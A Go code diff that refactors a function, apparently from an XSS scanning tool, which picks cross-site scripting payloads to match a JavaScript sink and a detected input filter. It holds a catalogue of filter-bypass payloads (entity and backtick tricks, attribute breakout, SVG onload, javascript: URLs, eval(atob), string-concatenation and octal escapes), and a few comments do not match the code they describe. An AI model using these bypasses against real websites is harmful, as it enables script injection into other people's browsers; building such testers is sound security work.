@@ -17,66 +17,102 @@ func suggestPayload(sinkFunc, filterType string) string {
 	lower := strings.ToLower(sinkFunc)
 	filterLower := strings.ToLower(filterType)
 
-	// If parentheses and backticks are filtered, use HTML entity bypass
-	if strings.Contains(filterLower, "parentheses") && strings.Contains(filterLower, "backtick") {
+	// Helper function to get base payload for sink type
+	getBasePayload := func(encodeFunc func(string) string) string {
 		switch {
 		case strings.Contains(lower, "document.write") || strings.Contains(lower, "writeln"):
-			return `<img src=x onerror=alert&#40;1&#41;>`
+			return encodeFunc(`<script>alert(1)</script>`)
 		case strings.Contains(lower, "innerhtml") || strings.Contains(lower, "outerhtml"):
-			return `<img src=x onerror=alert&#40;1&#41;>`
-		default:
-			return `<img src=x onerror=alert&#40;1&#41;>`
-		}
-	}
-
-	// If only parentheses are filtered, use backtick bypass
-	if strings.Contains(filterLower, "parentheses") || strings.Contains(filterLower, "()") {
-		switch {
-		case strings.Contains(lower, "document.write") || strings.Contains(lower, "writeln"):
-			return `<img src=x onerror=alert` + "`" + `1` + "`" + `>`
-		case strings.Contains(lower, "innerhtml") || strings.Contains(lower, "outerhtml"):
-			return `<img src=x onerror=alert` + "`" + `1` + "`" + `>`
+			return encodeFunc(`<img src=x onerror=alert(1)>`)
 		case strings.Contains(lower, "eval") || strings.Contains(lower, "function(") || strings.Contains(lower, "new function"):
-			return `alert` + "`" + `1` + "`"
+			return encodeFunc(`alert(1)`)
 		case strings.Contains(lower, "settimeout") || strings.Contains(lower, "setinterval"):
-			return `alert` + "`" + `1` + "`"
+			return encodeFunc(`alert(1)`)
+		case strings.Contains(lower, "insertadjacenthtml"):
+			return encodeFunc(`<img src=x onerror=alert(1)>`)
+		case strings.Contains(lower, ".html("):
+			return encodeFunc(`<img src=x onerror=alert(1)>`)
+		case strings.Contains(lower, "setattribute"):
+			return encodeFunc(`alert(1)`)
 		default:
-			return `<img src=x onerror=alert` + "`" + `1` + "`" + `>`
+			return encodeFunc(`<script>alert(1)</script>`)
 		}
 	}
 
-	// If non-global tag/angle bracket filtering (only first < is replaced)
-	// Use payloads that don't start with <
+	// 1. Parentheses + backticks filtered → HTML entity bypass
+	if strings.Contains(filterLower, "parentheses") && strings.Contains(filterLower, "backtick") {
+		return getBasePayload(func(s string) string {
+			return strings.ReplaceAll(strings.ReplaceAll(s, "(", "&#40;"), ")", "&#41;")
+		})
+	}
+
+	// 2. Only parentheses filtered → backtick bypass
+	if strings.Contains(filterLower, "parentheses") || strings.Contains(filterLower, "()") {
+		return getBasePayload(func(s string) string {
+			return strings.ReplaceAll(strings.ReplaceAll(s, "(", "`"), ")", "`")
+		})
+	}
+
+	// 3. Non-global tag filtering → attribute breakout
 	if strings.Contains(filterLower, "regex strip tags") && !strings.Contains(filterLower, "global") {
-		switch {
-		case strings.Contains(lower, "document.write") || strings.Contains(lower, "writeln"):
-			return `" onmouseover="alert(1)` // Break out of attribute
-		case strings.Contains(lower, "innerhtml") || strings.Contains(lower, "outerhtml"):
-			return `" onmouseover="alert(1)`
-		default:
-			return `" onmouseover="alert(1)`
-		}
+		return `" onmouseover="alert(1)`
 	}
 
-	// Standard payloads
-	switch {
-	case strings.Contains(lower, "document.write") || strings.Contains(lower, "writeln"):
-		return `<script>alert(1)</script>`
-	case strings.Contains(lower, "innerhtml") || strings.Contains(lower, "outerhtml"):
-		return `<img src=x onerror=alert(1)>`
-	case strings.Contains(lower, "eval") || strings.Contains(lower, "function(") || strings.Contains(lower, "new function"):
-		return `alert(1)`
-	case strings.Contains(lower, "settimeout") || strings.Contains(lower, "setinterval"):
-		return `alert(1)`
-	case strings.Contains(lower, "insertadjacenthtml"):
-		return `<img src=x onerror=alert(1)>`
-	case strings.Contains(lower, ".html("):
-		return `<img src=x onerror=alert(1)>`
-	case strings.Contains(lower, "setattribute"):
-		return `alert(1)`
-	default:
-		return `<script>alert(1)</script>`
+	// 4. Global tag filtering → try double encoding or alternative vectors
+	if strings.Contains(filterLower, "regex strip tags") && strings.Contains(filterLower, "global") {
+		// Try SVG/MathML vectors that might bypass basic < filtering
+		return `<svg onload=alert(1)>`
 	}
+
+	// 5. HTML special chars filtered → JavaScript protocol
+	if strings.Contains(filterLower, "html special chars") || strings.Contains(filterLower, "html and parentheses") {
+		return `javascript:alert(1)`
+	}
+
+	// 6. Alphanumeric whitelist → eval/atob bypass
+	if strings.Contains(filterLower, "whitelist alphanumeric") || strings.Contains(filterLower, "whitelist lowercase") {
+		return `eval(atob('YWxlcnQoMSk='))` // base64 encoded alert(1)
+	}
+
+	// 7. Non-word chars filtered → Unicode escape bypass
+	if strings.Contains(filterLower, "strip non-word") {
+		return `alert(1)` // Unicode escape for 'a'
+	}
+
+	// 8. Alert/function names filtered → indirect execution
+	if strings.Contains(filterLower, "strip alert") || strings.Contains(filterLower, "strip eval") {
+		return `window['al'+'ert'](1)` // String concatenation bypass
+	}
+
+	// 9. Document/window filtered → self-referencing
+	if strings.Contains(filterLower, "strip document") || strings.Contains(filterLower, "strip window") {
+		return `this['al'+'ert'](1)` // this refers to window in event handlers
+	}
+
+	// 10. Hex/unicode escapes filtered → octal or decimal
+	if strings.Contains(filterLower, "strip hex escapes") || strings.Contains(filterLower, "strip unicode escapes") {
+		return `\141lert(1)` // Octal escape for 'a'
+	}
+
+	// 11. URL encoding filtered → double URL encoding
+	if strings.Contains(filterLower, "strip url encoding") {
+		return `%253Cscript%253Ealert(1)%253C/script%253E` // Double URL encoding
+	}
+
+	// 12. Quotes filtered → template literals or no-quote payloads
+	if strings.Contains(filterLower, "strip quotes") {
+		return getBasePayload(func(s string) string {
+			return s // Payloads without quotes
+		})
+	}
+
+	// 13. Digits filtered → no-digit payloads
+	if strings.Contains(filterLower, "strip digits") {
+		return `<img src=x onerror=alert(location)>` // Use location instead of 1
+	}
+
+	// 14. Standard payloads (no filtering detected)
+	return getBasePayload(func(s string) string { return s })
 }
 
 // extractParamName extracts the parameter name from SourceName like "URL helper functions(via xss)"
